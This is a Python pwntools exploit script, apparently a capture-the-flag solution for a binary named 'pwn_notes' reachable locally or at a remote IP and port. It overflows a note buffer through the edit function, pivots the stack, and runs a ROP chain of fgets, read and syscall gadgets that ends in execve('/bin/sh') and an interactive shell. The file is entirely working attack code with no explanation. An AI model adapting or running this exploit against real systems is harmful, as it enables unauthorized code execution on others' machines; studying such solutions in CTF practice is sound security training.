#!/usr/bin/env python
from pwn import *

def create(length, data='A'):
    s.sendlineafter('Choice: ', '1')
    s.sendlineafter('length: ', str(length))
    s.sendafter('encrypt: ', data)

def edit(index, data):
    s.sendlineafter('Choice: ', '2')
    s.sendlineafter('edit: ', str(index))
    s.sendafter('encrypt: ', data)

def destroy(index):
    s.sendlineafter('Choice: ', '3')
    s.sendlineafter('destroy: ', str(index))

def show(index):
    s.sendlineafter('Choice: ', '4')
    s.sendlineafter('print: ', str(index))

if len(sys.argv) == 1:
    s = process('./pwn_notes')
else:
    s = remote('206.81.24.129', 1338)

notes = 0x80eea20
pop_eax = 0x80ba046
pop_ebx = 0x80481c9
pop_ecx = 0x80d8e3d
pop_edx = 0x80708cb
pop_esp = 0x80b9ff6
add_esp_c = 0x804f07a
add_esp_28 = 0x80a4cd1
syscall = 0x8070ee0
read = 0x806ee30
fgets = 0x80502e0
stdin = 0x80ed3a0

create(0x83, 'A' * 0x80 + '\x00\x10')
create(0x20)
edit(0, 'A' * 0x80 + p32(0x1000) + 'A' * 0x4 + p32(0x111) + p32(add_esp_28))

s.sendlineafter('Choice: ', '4')
payload = ''
payload += '1' + '\0' * 7
payload += p32(fgets)
payload += p32(pop_esp)
payload += p32(notes + 4) + p32(0x100) + p32(stdin)
s.sendlineafter('print: ', payload)

payload = ''
payload += p32(read)
payload += p32(add_esp_c)
payload += p32(0) + p32(notes + 0x18) + p32(0x100)
s.sendline(payload)

time.sleep(1)

payload = ''
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx) + p32(notes + 0x3c)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(syscall)
payload += '/bin/sh\0'
s.send(payload)

s.interactive()
